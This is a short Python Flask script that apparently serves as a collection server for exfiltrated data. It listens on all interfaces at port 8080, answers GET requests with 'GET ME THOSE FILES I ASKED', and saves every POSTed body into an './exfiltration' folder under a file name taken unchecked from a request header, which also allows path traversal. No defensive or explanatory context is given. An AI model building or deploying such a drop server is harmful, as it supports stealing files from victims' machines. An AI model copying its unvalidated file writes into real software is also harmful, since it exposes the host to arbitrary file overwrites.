def main():
    app = Flask('app')

    @app.route('/',methods = ['GET', 'POST'])
    def run():
        if request.method == 'GET':
            return 'GET ME THOSE FILES I ASKED'
        if request.method == 'POST':
            # data = request.json
            # import pdb
            # pdb.set_trace()
            if not os.path.exists('./exfiltration'):
                os.mkdir('./exfiltration')
            ## wb enables to write bianry
            with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
                # Write bytes to file
                f.write(request.data)
            f.close()
            return "OK"

    
    app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
    main()